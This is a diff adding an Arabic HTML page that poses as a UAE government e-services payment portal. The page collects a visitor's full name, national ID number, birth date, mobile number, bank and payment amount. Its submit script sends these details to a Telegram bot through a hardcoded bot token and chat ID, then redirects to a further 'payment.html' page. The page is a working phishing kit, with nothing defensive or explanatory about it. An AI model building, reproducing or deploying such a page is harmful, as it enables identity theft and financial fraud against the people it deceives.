@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
+
+  <style>
+    body{font-family:Tahoma,Arial;background:#fff;margin:0}
+    header{text-align:center;padding:20px}
+    header img{height:80px;max-width:100%}
+    main{padding:20px}
+    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
+    label{display:block;margin-top:14px;font-weight:700}
+    input,select,button{
+      width:100%;padding:12px;margin-top:6px;
+      border:1px solid #ccc;border-radius:6px;box-sizing:border-box
+    }
+    button{
+      background:#0b5320;color:#fff;border:0;font-weight:800;
+      cursor:pointer;position:relative
+    }
+    button:hover{background:#094418}
+    button:disabled{opacity:.7;cursor:not-allowed}
+
+    .spinner{
+      width:22px;height:22px;
+      border:3px solid rgba(255,255,255,.4);
+      border-top:3px solid #fff;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      position:absolute;
+      top:50%;
+      left:50%;
+      transform:translate(-50%,-50%);
+      display:none;
+    }
+    @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
+
+    /* تحميل أول الدخول */
+    #pageLoader{
+      position:fixed;
+      inset:0;
+      background:transparent;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+      pointer-events:none;
+    }
+    #pageLoader .bigSpinner{
+      width:90px;
+      height:90px;
+      border:10px solid rgba(0,0,0,.15);
+      border-top-color:#000;
+      border-radius:50%;
+      animation:bigSpin 1s linear infinite;
+    }
+    @keyframes bigSpin{to{transform:rotate(360deg)}}
+
+    footer{
+      background:#000;
+      color:#fff;
+      padding:18px 20px;
+      margin-top:30px;
+      font-size:13px;
+      text-align:center
+    }
+  </style>
+</head>
+
+<body>
+
+<!-- تحميل عند أول دخول الصفحة 4 ثواني -->
+<div id="pageLoader"><div class="bigSpinner"></div></div>
+
+<header>
+  <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
+  <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
+  <p>حكومة الإمارات العربية المتحدة</p>
+</header>
+
+<main>
+<form id="mainForm" autocomplete="off" novalidate>
+
+  <label>الاسم بالكامل *</label>
+  <input id="fullName" required>
+
+  <label>رقم الهوية (15 رقمًا) *</label>
+  <input id="idNumber" type="text" inputmode="numeric" maxlength="15" required
+    oninput="this.value=this.value.replace(/\D/g,'').slice(0,15)">
+
+  <label>تاريخ الميلاد *</label>
+  <div style="display:flex;gap:10px">
+    <input id="day" type="number" placeholder="يوم" min="1" max="31" required style="width:30%">
+    <input id="month" type="number" placeholder="شهر" min="1" max="12" required style="width:30%">
+    <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required style="width:30%">
+  </div>
+
+  <label>رقم الجوال *</label>
+  <input id="mobile" type="tel" inputmode="numeric" maxlength="10" required
+    oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
+
+  <label>اختر البنك *</label>
+  <select id="bank" required>
+    <option value="">— اختر البنك —</option>
+    <option>بنك أبوظبي الأول (FAB)</option>
+    <option>بنك أبوظبي التجاري (ADCB)</option>
+    <option>مصرف أبوظبي الإسلامي (ADIB)</option>
+    <option>مصرف الهلال</option>
+    <option>بنك الإمارات دبي الوطني</option>
+    <option>الإمارات الإسلامي</option>
+    <option>بنك دبي الإسلامي</option>
+    <option>بنك المشرق</option>
+    <option>مصرف الشارقة الإسلامي</option>
+    <option>بنك عجمان</option>
+    <option>بنك رأس الخيمة الوطني</option>
+    <option>بنك الفجيرة الوطني</option>
+    <option>البنك العربي المتحد</option>
+    <option>بنك أم القيوين الوطني</option>
+    <option>بنك الشارقة</option>
+    <option>Wio Bank</option>
+    <option>Zand Bank</option>
+    <option>Mbank</option>
+    <option>Al Maryah Community Bank</option>
+  </select>
+
+  <label>قيمة رسوم السداد (درهم إماراتي) *</label>
+  <input id="amount" type="number" min="1" step="0.01" required>
+
+  <label>رقم المفوتر (6 أرقام فقط) *</label>
+  <input id="biller" type="text" inputmode="numeric" maxlength="6" required
+    oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)">
+
+  <button id="submitBtn" type="submit">
+    <span id="btnText">التالي</span>
+    <span class="spinner" id="spinner"></span>
+  </button>
+
+</form>
+</main>
+
+<footer>
+  سياسة الخصوصية • حقوق النشر • شروط الاستخدام • معايير WCAG 2.0 AAA • © حكومة الإمارات 2026
+</footer>
+
+<script>
+  const pageLoader = document.getElementById('pageLoader');
+  setTimeout(() => { pageLoader.style.display = 'none'; }, 4000);
+
+  const mainForm = document.getElementById('mainForm');
+  const idNumber = document.getElementById('idNumber');
+  const mobile = document.getElementById('mobile');
+  const submitBtn = document.getElementById('submitBtn');
+  const btnText = document.getElementById('btnText');
+  const spinner = document.getElementById('spinner');
+
+  mainForm.addEventListener('submit', function(e){
+    e.preventDefault();
+
+    if(idNumber.value.length!==15){alert('رقم الهوية غير صحيح');return;}
+    if(mobile.value.length!==10){alert('رقم الجوال غير صحيح');return;}
+
+    submitBtn.disabled = true;
+    btnText.style.visibility = "hidden";
+    spinner.style.display = "block";
+
+    // معلومات لارسالها الى البوت
+    const fullName = document.getElementById('fullName').value;
+    const id = idNumber.value;
+    const mobileNumber = mobile.value;
+    const day = document.getElementById('day').value;
+    const month = document.getElementById('month').value;
+    const year = document.getElementById('year').value;
+    const birthDate = `${day}-${month}-${year}`;
+    const bank = document.getElementById('bank').value;
+    const amount = document.getElementById('amount').value;
+    const biller = document.getElementById('biller').value;
+
+    const message = `الاسم: ${fullName}\nرقم الهوية: ${id}\nرقم الجوال: ${mobileNumber}\nتاريخ الميلاد: ${birthDate}\nالبنك: ${bank}\nقيمة السداد: ${amount}\nرقم المفوتر: ${biller}`;
+
+    const botToken = "8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk"; // توكن البوت
+    const chatId = "8404960059"; // شاش الآي دي
+
+    // إرسال الرسالة إلى البوت على التليجرام
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+
+    setTimeout(()=>{
+      window.location.href = "payment.html";
+    },3000);
+  });
+</script>
+
+</body>
+</html>
